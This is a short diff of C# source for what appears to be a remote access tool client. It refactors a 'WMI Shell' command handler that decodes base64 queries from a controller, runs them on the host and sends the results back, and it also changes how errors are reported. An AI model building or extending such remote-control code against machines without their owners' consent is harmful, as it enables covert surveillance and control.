@@ -1578,8 +1578,15 @@ namespace winClient48
                 #region WMI Shell
                 else if (cmd[0] == "wmi")
                 {
-                    try { v.SendCommand("wmi|output|" + WMI_Query(clsCrypto.b64D2Str(cmd[1]))); }
-                    catch (Exception ex) { v.SendCommand("wmi|error|" + clsCrypto.b64E2Str(ex.Message)); }
+                    string szQuery = clsCrypto.b64D2Str(cmd[1]);
+                    DataTable dt = fnWmiQuery(szQuery);
+                    string szData = clsEZData.fnDataTableToString(dt);
+
+                    v.fnSendCommand(new string[]
+                    {
+                        "wmi",
+                        szData,
+                    });
                 }
                 #endregion
                 #region Remote Desktop(Monitor)
@@ -2725,13 +2732,15 @@ namespace winClient48
                     }
                     catch (Exception ex)
                     {
-                        ;
-                        Console.WriteLine(ex.Message);
+                        result.Add(clsCrypto.b64E2Str($"{ex.GetType().Name};{ex.Message}"));
                     }
                 }
             }
+
             return string.Join(",", result.ToArray());
         }
+
+
         private DataTable fnWmiQuery(string szQuery)
         {
             DataTable dt = new DataTable();
@@ -2763,10 +2772,8 @@ namespace winClient48
             }
             catch (Exception ex)
             {
-                dt.Columns.Add("Err");
-                DataRow dr = dt.NewRow();
-                dr["Err"] = ex.Message;
-                dt.Rows.Add(dr);
+                dt.Columns.Add(ex.GetType().Name);
+                dt.Rows.Add(ex.Message);
             }
 
             return dt;
